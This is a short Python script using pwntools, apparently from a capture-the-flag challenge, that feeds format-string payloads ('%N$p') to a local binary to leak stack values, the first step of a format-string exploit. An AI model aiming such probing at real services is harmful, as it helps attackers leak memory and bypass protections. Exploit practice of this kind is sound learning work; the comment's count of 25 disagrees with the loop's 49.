from pwn import *

elf = context.binary = ELF('./chal_64', checksec=False)



# Let's fuzz 25 values
for i in range(1,50):
    try:
        p = process(level='error')
        p.sendlineafter(b'Input: \n', '%{}$p'.format(i).encode())
        result = p.recvline()
        leak_char = result.ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass